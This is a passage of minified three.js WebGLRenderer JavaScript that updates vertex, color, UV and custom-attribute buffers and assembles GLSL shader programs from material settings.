l.bufferData(l.ARRAY_BUFFER,nb,H)}if(Rb&&Sb&&ja){E=0;for(U=na.length;E<U;E++)if(V=na[E],ga=Sb[V],void 0!==ga)for(sa=0;3>sa;sa++)kb=ga[sa],qb[Ib]=kb.x,qb[Ib+1]=kb.y,Ib+=2;E=0;for(U=oa.length;E<U;E++)if(V=oa[E],ga=Sb[V],void 0!==ga)for(sa=0;4>sa;sa++)kb=ga[sa],qb[Ib]=kb.x,qb[Ib+1]=kb.y,Ib+=2;0<Ib&&(l.bindBuffer(l.ARRAY_BUFFER,F.__webglUVBuffer),l.bufferData(l.ARRAY_BUFFER,qb,H))}if(Rb&&Tb&&ja){E=0;for(U=na.length;E<U;E++)if(V=na[E],wa=Tb[V],void 0!==wa)for(sa=0;3>sa;sa++)lb=wa[sa],rb[Jb]=lb.x,rb[Jb+
1]=lb.y,Jb+=2;E=0;for(U=oa.length;E<U;E++)if(V=oa[E],wa=Tb[V],void 0!==wa)for(sa=0;4>sa;sa++)lb=wa[sa],rb[Jb]=lb.x,rb[Jb+1]=lb.y,Jb+=2;0<Jb&&(l.bindBuffer(l.ARRAY_BUFFER,F.__webglUV2Buffer),l.bufferData(l.ARRAY_BUFFER,rb,H))}if(Qb){E=0;for(U=na.length;E<U;E++)yb[mb]=Ka,yb[mb+1]=Ka+1,yb[mb+2]=Ka+2,mb+=3,jb[bb]=Ka,jb[bb+1]=Ka+1,jb[bb+2]=Ka,jb[bb+3]=Ka+2,jb[bb+4]=Ka+1,jb[bb+5]=Ka+2,bb+=6,Ka+=3;E=0;for(U=oa.length;E<U;E++)yb[mb]=Ka,yb[mb+1]=Ka+1,yb[mb+2]=Ka+3,yb[mb+3]=Ka+1,yb[mb+4]=Ka+2,yb[mb+5]=Ka+3,
mb+=6,jb[bb]=Ka,jb[bb+1]=Ka+1,jb[bb+2]=Ka,jb[bb+3]=Ka+3,jb[bb+4]=Ka+1,jb[bb+5]=Ka+2,jb[bb+6]=Ka+2,jb[bb+7]=Ka+3,bb+=8,Ka+=4;l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,F.__webglFaceBuffer);l.bufferData(l.ELEMENT_ARRAY_BUFFER,yb,H);l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,F.__webglLineBuffer);l.bufferData(l.ELEMENT_ARRAY_BUFFER,jb,H)}if(Gb)for(sa=0,sb=Gb.length;sa<sb;sa++)if(x=Gb[sa],x.__original.needsUpdate){A=0;if(1===x.size)if(void 0===x.boundTo||"vertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],
x.array[A]=x.value[N.a],x.array[A+1]=x.value[N.b],x.array[A+2]=x.value[N.c],A+=3;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],x.array[A]=x.value[N.a],x.array[A+1]=x.value[N.b],x.array[A+2]=x.value[N.c],x.array[A+3]=x.value[N.d],A+=4}else{if("faces"===x.boundTo){E=0;for(U=na.length;E<U;E++)ua=x.value[na[E]],x.array[A]=ua,x.array[A+1]=ua,x.array[A+2]=ua,A+=3;E=0;for(U=oa.length;E<U;E++)ua=x.value[oa[E]],x.array[A]=ua,x.array[A+1]=ua,x.array[A+2]=ua,x.array[A+3]=ua,A+=4}}else if(2===x.size)if(void 0===x.boundTo||
"vertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],R=x.value[N.a],S=x.value[N.b],Q=x.value[N.c],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=S.x,x.array[A+3]=S.y,x.array[A+4]=Q.x,x.array[A+5]=Q.y,A+=6;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],R=x.value[N.a],S=x.value[N.b],Q=x.value[N.c],da=x.value[N.d],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=S.x,x.array[A+3]=S.y,x.array[A+4]=Q.x,x.array[A+5]=Q.y,x.array[A+6]=da.x,x.array[A+7]=da.y,A+=8}else{if("faces"===x.boundTo){E=0;for(U=na.length;E<
U;E++)Q=S=R=ua=x.value[na[E]],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=S.x,x.array[A+3]=S.y,x.array[A+4]=Q.x,x.array[A+5]=Q.y,A+=6;E=0;for(U=oa.length;E<U;E++)da=Q=S=R=ua=x.value[oa[E]],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=S.x,x.array[A+3]=S.y,x.array[A+4]=Q.x,x.array[A+5]=Q.y,x.array[A+6]=da.x,x.array[A+7]=da.y,A+=8}}else if(3===x.size){var aa;aa="c"===x.type?["r","g","b"]:["x","y","z"];if(void 0===x.boundTo||"vertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],R=x.value[N.a],
S=x.value[N.b],Q=x.value[N.c],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],x.array[A+8]=Q[aa[2]],A+=9;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],R=x.value[N.a],S=x.value[N.b],Q=x.value[N.c],da=x.value[N.d],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],
x.array[A+8]=Q[aa[2]],x.array[A+9]=da[aa[0]],x.array[A+10]=da[aa[1]],x.array[A+11]=da[aa[2]],A+=12}else if("faces"===x.boundTo){E=0;for(U=na.length;E<U;E++)Q=S=R=ua=x.value[na[E]],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],x.array[A+8]=Q[aa[2]],A+=9;E=0;for(U=oa.length;E<U;E++)da=Q=S=R=ua=x.value[oa[E]],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+
3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],x.array[A+8]=Q[aa[2]],x.array[A+9]=da[aa[0]],x.array[A+10]=da[aa[1]],x.array[A+11]=da[aa[2]],A+=12}else if("faceVertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)ua=x.value[na[E]],R=ua[0],S=ua[1],Q=ua[2],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],x.array[A+8]=Q[aa[2]],
A+=9;E=0;for(U=oa.length;E<U;E++)ua=x.value[oa[E]],R=ua[0],S=ua[1],Q=ua[2],da=ua[3],x.array[A]=R[aa[0]],x.array[A+1]=R[aa[1]],x.array[A+2]=R[aa[2]],x.array[A+3]=S[aa[0]],x.array[A+4]=S[aa[1]],x.array[A+5]=S[aa[2]],x.array[A+6]=Q[aa[0]],x.array[A+7]=Q[aa[1]],x.array[A+8]=Q[aa[2]],x.array[A+9]=da[aa[0]],x.array[A+10]=da[aa[1]],x.array[A+11]=da[aa[2]],A+=12}}else if(4===x.size)if(void 0===x.boundTo||"vertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],R=x.value[N.a],S=x.value[N.b],Q=x.value[N.c],
x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+10]=Q.z,x.array[A+11]=Q.w,A+=12;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],R=x.value[N.a],S=x.value[N.b],Q=x.value[N.c],da=x.value[N.d],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+10]=Q.z,x.array[A+
11]=Q.w,x.array[A+12]=da.x,x.array[A+13]=da.y,x.array[A+14]=da.z,x.array[A+15]=da.w,A+=16}else if("faces"===x.boundTo){E=0;for(U=na.length;E<U;E++)Q=S=R=ua=x.value[na[E]],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+10]=Q.z,x.array[A+11]=Q.w,A+=12;E=0;for(U=oa.length;E<U;E++)da=Q=S=R=ua=x.value[oa[E]],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,
x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+10]=Q.z,x.array[A+11]=Q.w,x.array[A+12]=da.x,x.array[A+13]=da.y,x.array[A+14]=da.z,x.array[A+15]=da.w,A+=16}else if("faceVertices"===x.boundTo){E=0;for(U=na.length;E<U;E++)ua=x.value[na[E]],R=ua[0],S=ua[1],Q=ua[2],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+
10]=Q.z,x.array[A+11]=Q.w,A+=12;E=0;for(U=oa.length;E<U;E++)ua=x.value[oa[E]],R=ua[0],S=ua[1],Q=ua[2],da=ua[3],x.array[A]=R.x,x.array[A+1]=R.y,x.array[A+2]=R.z,x.array[A+3]=R.w,x.array[A+4]=S.x,x.array[A+5]=S.y,x.array[A+6]=S.z,x.array[A+7]=S.w,x.array[A+8]=Q.x,x.array[A+9]=Q.y,x.array[A+10]=Q.z,x.array[A+11]=Q.w,x.array[A+12]=da.x,x.array[A+13]=da.y,x.array[A+14]=da.z,x.array[A+15]=da.w,A+=16}l.bindBuffer(l.ARRAY_BUFFER,x.buffer);l.bufferData(l.ARRAY_BUFFER,x.array,H)}L&&(delete F.__inittedArrays,
delete F.__colorArray,delete F.__normalArray,delete F.__tangentArray,delete F.__uvArray,delete F.__uv2Array,delete F.__faceArray,delete F.__vertexArray,delete F.__lineArray,delete F.__skinIndexArray,delete F.__skinWeightArray)}}m.verticesNeedUpdate=!1;m.morphTargetsNeedUpdate=!1;m.elementsNeedUpdate=!1;m.uvsNeedUpdate=!1;m.normalsNeedUpdate=!1;m.colorsNeedUpdate=!1;m.tangentsNeedUpdate=!1;m.buffersNeedUpdate=!1;u.attributes&&B(u)}else if(k instanceof THREE.Ribbon){u=g(k,m);y=u.attributes&&C(u);if(m.verticesNeedUpdate||
m.colorsNeedUpdate||m.normalsNeedUpdate||y){var ob=m,Bc=l.DYNAMIC_DRAW,lc=void 0,mc=void 0,nc=void 0,Cc=void 0,va=void 0,Dc=void 0,Ec=void 0,Fc=void 0,Yb=void 0,Xa=void 0,bc=void 0,Ca=void 0,fb=void 0,$b=ob.vertices,ac=ob.colors,ec=ob.normals,sc=$b.length,tc=ac.length,uc=ec.length,Gc=ob.__vertexArray,Hc=ob.__colorArray,Ic=ob.__normalArray,vc=ob.colorsNeedUpdate,wc=ob.normalsNeedUpdate,Uc=ob.__webglCustomAttributesList;if(ob.verticesNeedUpdate){for(lc=0;lc<sc;lc++)Cc=$b[lc],va=3*lc,Gc[va]=Cc.x,Gc[va+
1]=Cc.y,Gc[va+2]=Cc.z;l.bindBuffer(l.ARRAY_BUFFER,ob.__webglVertexBuffer);l.bufferData(l.ARRAY_BUFFER,Gc,Bc)}if(vc){for(mc=0;mc<tc;mc++)Dc=ac[mc],va=3*mc,Hc[va]=Dc.r,Hc[va+1]=Dc.g,Hc[va+2]=Dc.b;l.bindBuffer(l.ARRAY_BUFFER,ob.__webglColorBuffer);l.bufferData(l.ARRAY_BUFFER,Hc,Bc)}if(wc){for(nc=0;nc<uc;nc++)Ec=ec[nc],va=3*nc,Ic[va]=Ec.x,Ic[va+1]=Ec.y,Ic[va+2]=Ec.z;l.bindBuffer(l.ARRAY_BUFFER,ob.__webglNormalBuffer);l.bufferData(l.ARRAY_BUFFER,Ic,Bc)}if(Uc)for(Fc=0,Yb=Uc.length;Fc<Yb;Fc++)if(Ca=Uc[Fc],
Ca.needsUpdate&&(void 0===Ca.boundTo||"vertices"===Ca.boundTo)){va=0;bc=Ca.value.length;if(1===Ca.size)for(Xa=0;Xa<bc;Xa++)Ca.array[Xa]=Ca.value[Xa];else if(2===Ca.size)for(Xa=0;Xa<bc;Xa++)fb=Ca.value[Xa],Ca.array[va]=fb.x,Ca.array[va+1]=fb.y,va+=2;else if(3===Ca.size)if("c"===Ca.type)for(Xa=0;Xa<bc;Xa++)fb=Ca.value[Xa],Ca.array[va]=fb.r,Ca.array[va+1]=fb.g,Ca.array[va+2]=fb.b,va+=3;else for(Xa=0;Xa<bc;Xa++)fb=Ca.value[Xa],Ca.array[va]=fb.x,Ca.array[va+1]=fb.y,Ca.array[va+2]=fb.z,va+=3;else if(4===
Ca.size)for(Xa=0;Xa<bc;Xa++)fb=Ca.value[Xa],Ca.array[va]=fb.x,Ca.array[va+1]=fb.y,Ca.array[va+2]=fb.z,Ca.array[va+3]=fb.w,va+=4;l.bindBuffer(l.ARRAY_BUFFER,Ca.buffer);l.bufferData(l.ARRAY_BUFFER,Ca.array,Bc)}}m.verticesNeedUpdate=!1;m.colorsNeedUpdate=!1;m.normalsNeedUpdate=!1;u.attributes&&B(u)}else if(k instanceof THREE.Line){u=g(k,m);y=u.attributes&&C(u);if(m.verticesNeedUpdate||m.colorsNeedUpdate||m.lineDistancesNeedUpdate||y){var pb=m,Jc=l.DYNAMIC_DRAW,oc=void 0,pc=void 0,qc=void 0,Kc=void 0,
Ha=void 0,Lc=void 0,gc=pb.vertices,jc=pb.colors,kc=pb.lineDistances,yc=gc.length,zc=jc.length,Rc=kc.length,Mc=pb.__vertexArray,Nc=pb.__colorArray,Zc=pb.__lineDistanceArray,Sc=pb.colorsNeedUpdate,Tc=pb.lineDistancesNeedUpdate,Vc=pb.__webglCustomAttributesList,Oc=void 0,$c=void 0,Ya=void 0,cc=void 0,gb=void 0,Da=void 0;if(pb.verticesNeedUpdate){for(oc=0;oc<yc;oc++)Kc=gc[oc],Ha=3*oc,Mc[Ha]=Kc.x,Mc[Ha+1]=Kc.y,Mc[Ha+2]=Kc.z;l.bindBuffer(l.ARRAY_BUFFER,pb.__webglVertexBuffer);l.bufferData(l.ARRAY_BUFFER,
Mc,Jc)}if(Sc){for(pc=0;pc<zc;pc++)Lc=jc[pc],Ha=3*pc,Nc[Ha]=Lc.r,Nc[Ha+1]=Lc.g,Nc[Ha+2]=Lc.b;l.bindBuffer(l.ARRAY_BUFFER,pb.__webglColorBuffer);l.bufferData(l.ARRAY_BUFFER,Nc,Jc)}if(Tc){for(qc=0;qc<Rc;qc++)Zc[qc]=kc[qc];l.bindBuffer(l.ARRAY_BUFFER,pb.__webglLineDistanceBuffer);l.bufferData(l.ARRAY_BUFFER,Zc,Jc)}if(Vc)for(Oc=0,$c=Vc.length;Oc<$c;Oc++)if(Da=Vc[Oc],Da.needsUpdate&&(void 0===Da.boundTo||"vertices"===Da.boundTo)){Ha=0;cc=Da.value.length;if(1===Da.size)for(Ya=0;Ya<cc;Ya++)Da.array[Ya]=Da.value[Ya];
else if(2===Da.size)for(Ya=0;Ya<cc;Ya++)gb=Da.value[Ya],Da.array[Ha]=gb.x,Da.array[Ha+1]=gb.y,Ha+=2;else if(3===Da.size)if("c"===Da.type)for(Ya=0;Ya<cc;Ya++)gb=Da.value[Ya],Da.array[Ha]=gb.r,Da.array[Ha+1]=gb.g,Da.array[Ha+2]=gb.b,Ha+=3;else for(Ya=0;Ya<cc;Ya++)gb=Da.value[Ya],Da.array[Ha]=gb.x,Da.array[Ha+1]=gb.y,Da.array[Ha+2]=gb.z,Ha+=3;else if(4===Da.size)for(Ya=0;Ya<cc;Ya++)gb=Da.value[Ya],Da.array[Ha]=gb.x,Da.array[Ha+1]=gb.y,Da.array[Ha+2]=gb.z,Da.array[Ha+3]=gb.w,Ha+=4;l.bindBuffer(l.ARRAY_BUFFER,
Da.buffer);l.bufferData(l.ARRAY_BUFFER,Da.array,Jc)}}m.verticesNeedUpdate=!1;m.colorsNeedUpdate=!1;m.lineDistancesNeedUpdate=!1;u.attributes&&B(u)}else if(k instanceof THREE.ParticleSystem){u=g(k,m);y=u.attributes&&C(u);if(m.verticesNeedUpdate||m.colorsNeedUpdate||k.sortParticles||y){var zb=m,Wc=l.DYNAMIC_DRAW,rc=k,hb=void 0,Ab=void 0,Bb=void 0,ea=void 0,Cb=void 0,Pb=void 0,Pc=zb.vertices,Xc=Pc.length,Yc=zb.colors,ad=Yc.length,Wb=zb.__vertexArray,Xb=zb.__colorArray,Kb=zb.__sortArray,bd=zb.verticesNeedUpdate,
cd=zb.colorsNeedUpdate,Lb=zb.__webglCustomAttributesList,tb=void 0,dc=void 0,ka=void 0,ub=void 0,za=void 0,ca=void 0;if(rc.sortParticles){Qc.copy(xc);Qc.multiply(rc.matrixWorld);for(hb=0;hb<Xc;hb++)Bb=Pc[hb],Pa.copy(Bb),Pa.applyProjection(Qc),Kb[hb]=[Pa.z,hb];Kb.sort(t);for(hb=0;hb<Xc;hb++)Bb=Pc[Kb[hb][1]],ea=3*hb,Wb[ea]=Bb.x,Wb[ea+1]=Bb.y,Wb[ea+2]=Bb.z;for(Ab=0;Ab<ad;Ab++)ea=3*Ab,Pb=Yc[Kb[Ab][1]],Xb[ea]=Pb.r,Xb[ea+1]=Pb.g,Xb[ea+2]=Pb.b;if(Lb)for(tb=0,dc=Lb.length;tb<dc;tb++)if(ca=Lb[tb],void 0===
ca.boundTo||"vertices"===ca.boundTo)if(ea=0,ub=ca.value.length,1===ca.size)for(ka=0;ka<ub;ka++)Cb=Kb[ka][1],ca.array[ka]=ca.value[Cb];else if(2===ca.size)for(ka=0;ka<ub;ka++)Cb=Kb[ka][1],za=ca.value[Cb],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ea+=2;else if(3===ca.size)if("c"===ca.type)for(ka=0;ka<ub;ka++)Cb=Kb[ka][1],za=ca.value[Cb],ca.array[ea]=za.r,ca.array[ea+1]=za.g,ca.array[ea+2]=za.b,ea+=3;else for(ka=0;ka<ub;ka++)Cb=Kb[ka][1],za=ca.value[Cb],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ca.array[ea+
2]=za.z,ea+=3;else if(4===ca.size)for(ka=0;ka<ub;ka++)Cb=Kb[ka][1],za=ca.value[Cb],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ca.array[ea+2]=za.z,ca.array[ea+3]=za.w,ea+=4}else{if(bd)for(hb=0;hb<Xc;hb++)Bb=Pc[hb],ea=3*hb,Wb[ea]=Bb.x,Wb[ea+1]=Bb.y,Wb[ea+2]=Bb.z;if(cd)for(Ab=0;Ab<ad;Ab++)Pb=Yc[Ab],ea=3*Ab,Xb[ea]=Pb.r,Xb[ea+1]=Pb.g,Xb[ea+2]=Pb.b;if(Lb)for(tb=0,dc=Lb.length;tb<dc;tb++)if(ca=Lb[tb],ca.needsUpdate&&(void 0===ca.boundTo||"vertices"===ca.boundTo))if(ub=ca.value.length,ea=0,1===ca.size)for(ka=
0;ka<ub;ka++)ca.array[ka]=ca.value[ka];else if(2===ca.size)for(ka=0;ka<ub;ka++)za=ca.value[ka],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ea+=2;else if(3===ca.size)if("c"===ca.type)for(ka=0;ka<ub;ka++)za=ca.value[ka],ca.array[ea]=za.r,ca.array[ea+1]=za.g,ca.array[ea+2]=za.b,ea+=3;else for(ka=0;ka<ub;ka++)za=ca.value[ka],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ca.array[ea+2]=za.z,ea+=3;else if(4===ca.size)for(ka=0;ka<ub;ka++)za=ca.value[ka],ca.array[ea]=za.x,ca.array[ea+1]=za.y,ca.array[ea+2]=za.z,ca.array[ea+
3]=za.w,ea+=4}if(bd||rc.sortParticles)l.bindBuffer(l.ARRAY_BUFFER,zb.__webglVertexBuffer),l.bufferData(l.ARRAY_BUFFER,Wb,Wc);if(cd||rc.sortParticles)l.bindBuffer(l.ARRAY_BUFFER,zb.__webglColorBuffer),l.bufferData(l.ARRAY_BUFFER,Xb,Wc);if(Lb)for(tb=0,dc=Lb.length;tb<dc;tb++)if(ca=Lb[tb],ca.needsUpdate||rc.sortParticles)l.bindBuffer(l.ARRAY_BUFFER,ca.buffer),l.bufferData(l.ARRAY_BUFFER,ca.array,Wc)}m.verticesNeedUpdate=!1;m.colorsNeedUpdate=!1;u.attributes&&B(u)}}};this.initMaterial=function(a,b,c,
e){var g,f,h,q;a.addEventListener("dispose",zc);var k,r,m,p,u;a instanceof THREE.MeshDepthMaterial?u="depth":a instanceof THREE.MeshNormalMaterial?u="normal":a instanceof THREE.MeshBasicMaterial?u="basic":a instanceof THREE.MeshLambertMaterial?u="lambert":a instanceof THREE.MeshPhongMaterial?u="phong":a instanceof THREE.LineBasicMaterial?u="basic":a instanceof THREE.LineDashedMaterial?u="dashed":a instanceof THREE.ParticleBasicMaterial&&(u="particle_basic");if(u){var y=THREE.ShaderLib[u];a.uniforms=
THREE.UniformsUtils.clone(y.uniforms);a.vertexShader=y.vertexShader;a.fragmentShader=y.fragmentShader}var B,t,z;g=h=t=z=y=0;for(f=b.length;g<f;g++)B=b[g],B.onlyShadow||(B instanceof THREE.DirectionalLight&&h++,B instanceof THREE.PointLight&&t++,B instanceof THREE.SpotLight&&z++,B instanceof THREE.HemisphereLight&&y++);g=h;f=t;h=z;q=y;y=B=0;for(z=b.length;y<z;y++)t=b[y],t.castShadow&&(t instanceof THREE.SpotLight&&B++,t instanceof THREE.DirectionalLight&&!t.shadowCascade&&B++);p=B;fc&&e&&e.useVertexTexture?
m=1024:(b=l.getParameter(l.MAX_VERTEX_UNIFORM_VECTORS),b=Math.floor((b-20)/4),void 0!==e&&e instanceof THREE.SkinnedMesh&&(b=Math.min(e.bones.length,b),b<e.bones.length&&console.warn("WebGLRenderer: too many bones - "+e.bones.length+", this GPU supports just "+b+" (try OpenGL instead of ANGLE)")),m=b);a:{z=a.fragmentShader;t=a.vertexShader;y=a.uniforms;b=a.attributes;B=a.defines;c={map:!!a.map,envMap:!!a.envMap,lightMap:!!a.lightMap,bumpMap:!!a.bumpMap,normalMap:!!a.normalMap,specularMap:!!a.specularMap,
vertexColors:a.vertexColors,fog:c,useFog:a.fog,fogExp:c instanceof THREE.FogExp2,sizeAttenuation:a.sizeAttenuation,skinning:a.skinning,maxBones:m,useVertexTexture:fc&&e&&e.useVertexTexture,boneTextureWidth:e&&e.boneTextureWidth,boneTextureHeight:e&&e.boneTextureHeight,morphTargets:a.morphTargets,morphNormals:a.morphNormals,maxMorphTargets:this.maxMorphTargets,maxMorphNormals:this.maxMorphNormals,maxDirLights:g,maxPointLights:f,maxSpotLights:h,maxHemiLights:q,maxShadows:p,shadowMapEnabled:this.shadowMapEnabled&&
e.receiveShadow,shadowMapType:this.shadowMapType,shadowMapDebug:this.shadowMapDebug,shadowMapCascade:this.shadowMapCascade,alphaTest:a.alphaTest,metal:a.metal,perPixel:a.perPixel,wrapAround:a.wrapAround,doubleSided:a.side===THREE.DoubleSide,flipSided:a.side===THREE.BackSide};var w,D,C;e=[];u?e.push(u):(e.push(z),e.push(t));for(D in B)e.push(D),e.push(B[D]);for(w in c)e.push(w),e.push(c[w]);u=e.join();w=0;for(D=ga.length;w<D;w++)if(e=ga[w],e.code===u){e.usedTimes++;r=e.program;break a}w="SHADOWMAP_TYPE_BASIC";
c.shadowMapType===THREE.PCFShadowMap?w="SHADOWMAP_TYPE_PCF":c.shadowMapType===THREE.PCFSoftShadowMap&&(w="SHADOWMAP_TYPE_PCF_SOFT");D=[];for(C in B)e=B[C],!1!==e&&(e="#define "+C+" "+e,D.push(e));e=D.join("\n");C=l.createProgram();D=["precision "+ja+" float;",e,ac?"#define VERTEX_TEXTURES":"",P.gammaInput?"#define GAMMA_INPUT":"",P.gammaOutput?"#define GAMMA_OUTPUT":"",P.physicallyBasedShading?"#define PHYSICALLY_BASED_SHADING":"","#define MAX_DIR_LIGHTS "+c.maxDirLights,"#define MAX_POINT_LIGHTS "+
c.maxPointLights,"#define MAX_SPOT_LIGHTS "+c.maxSpotLights,"#define MAX_HEMI_LIGHTS "+c.maxHemiLights,"#define MAX_SHADOWS "+c.maxShadows,"#define MAX_BONES "+c.maxBones,c.map?"#define USE_MAP":"",c.envMap?"#define USE_ENVMAP":"",c.lightMap?"#define USE_LIGHTMAP":"",c.bumpMap?"#define USE_BUMPMAP":"",c.normalMap?"#define USE_NORMALMAP":"",c.specularMap?"#define USE_SPECULARMAP":"",c.vertexColors?"#define USE_COLOR":"",c.skinning?"#define USE_SKINNING":"",c.useVertexTexture?"#define BONE_TEXTURE":
"",c.boneTextureWidth?"#define N_BONE_PIXEL_X "+c.boneTextureWidth.toFixed(1):"",c.boneTextureHeight?"#define N_BONE_PIXEL_Y "+c.boneTextureHeight.toFixed(1):"",c.morphTargets?"#define USE_MORPHTARGETS":"",c.morphNormals?"#define USE_MORPHNORMALS":"",c.perPixel?"#define PHONG_PER_PIXEL":"",c.wrapAround?"#define WRAP_AROUND":"",c.doubleSided?"#define DOUBLE_SIDED":"",c.flipSided?"#define FLIP_SIDED":"",c.shadowMapEnabled?"#define USE_SHADOWMAP":"",c.shadowMapEnabled?"#define "+w:"",c.shadowMapDebug?
"#define SHADOWMAP_DEBUG":"",c.shadowMapCascade?"#define SHADOWMAP_CASCADE":"",c.sizeAttenuation?"#define USE_SIZEATTENUATION":"","uniform mat4 modelMatrix;\nuniform mat4 modelViewMatrix;\nuniform mat4 projectionMatrix;\nuniform mat4 viewMatrix;\nuniform mat3 normalMatrix;\nuniform vec3 cameraPosition;\nattribute vec3 position;\nattribute vec3 normal;\nattribute vec2 uv;\nattribute vec2 uv2;\n#ifdef USE_COLOR\nattribute vec3 color;\n#endif\n#ifdef USE_MORPHTARGETS\nattribute vec3 morphTarget0;\nattribute vec3 morphTarget1;\nattribute vec3 morphTarget2;\nattribute vec3 morphTarget3;\n#ifdef USE_MORPHNORMALS\nattribute vec3 morphNormal0;\nattribute vec3 morphNormal1;\nattribute vec3 morphNormal2;\nattribute vec3 morphNormal3;\n#else\nattribute vec3 morphTarget4;\nattribute vec3 morphTarget5;\nattribute vec3 morphTarget6;\nattribute vec3 morphTarget7;\n#endif\n#endif\n#ifdef USE_SKINNING\nattribute vec4 skinIndex;\nattribute vec4 skinWeight;\n#endif\n"].join("\n");
w=["precision "+ja+" float;",c.bumpMap||c.normalMap?"#extension GL_OES_standard_derivatives : enable":"",e,"#define MAX_DIR_LIGHTS "+c.maxDirLights,"#define MAX_POINT_LIGHTS "+c.maxPointLights,"#define MAX_SPOT_LIGHTS "+c.maxSpotLights,"#define MAX_HEMI_LIGHTS "+c.maxHemiLights,"#define MAX_SHADOWS "+c.maxShadows,c.alphaTest?"#define ALPHATEST "+c.alphaTest:"",P.gammaInput?"#define GAMMA_INPUT":"",P.gammaOutput?"#define GAMMA_OUTPUT":"",P.physicallyBasedShading?"#define PHYSICALLY_BASED_SHADING":
"",c.useFog&&c.fog?"#define USE_FOG":"",c.useFog&&c.fogExp?"#define FOG_EXP2":"",c.map?"#define USE_MAP":"",c.envMap?"#define USE_ENVMAP":"",c.lightMap?"#define USE_LIGHTMAP":"",c.bumpMap?"#define USE_BUMPMAP":"",c.normalMap?"#define USE_NORMALMAP":"",c.specularMap?"#define USE_SPECULARMAP":"",c.vertexColors?"#define USE_COLOR":"",c.metal?"#define METAL":"",c.perPixel?"#define PHONG_PER_PIXEL":"",c.wrapAround?"#define WRAP_AROUND":"",c.doubleSided?"#define DOUBLE_SIDED":"",c.flipSided?"#define FLIP_SIDED":
"",c.shadowMapEnabled?"#define USE_SHADOWMAP":"",c.shadowMapEnabled?"#define "+w:"",c.shadowMapDebug?"#define SHADOWMAP_DEBUG":"",c.shadowMapCascade?"#define SHADOWMAP_CASCADE":"","uniform mat4 viewMatrix;\nuniform vec3 cameraPosition;\n"].join("\n");D=M("vertex",D+t);w=M("fragment",w+z);l.attachShader(C,D);l.attachShader(C,w);l.linkProgram(C);l.getProgramParameter(C,l.LINK_STATUS)||console.error("Could not initialise shader\nVALIDATE_STATUS: "+l.getProgramParameter(C,l.VALIDATE_STATUS)+", gl error ["+
l.getError()+"]");l.deleteShader(w);l.deleteShader(D);C.uniforms={};C.attributes={};var G;w="viewMatrix modelViewMatrix projectionMatrix normalMatrix modelMatrix cameraPosition morphTargetInfluences".split(" ");c.useVertexTexture?w.push("boneTexture"):w.push("boneGlobalMatrices");for(G in y)w.push(G);G=w;w=0;for(D=G.length;w<D;w++)y=G[w],C.uniforms[y]=l.getUniformLocation(C,y);w="position normal uv uv2 tangent color skinIndex skinWeight lineDistance".split(" ");for(G=0;G<c.maxMorphTargets;G++)w.push("morphTarget"+
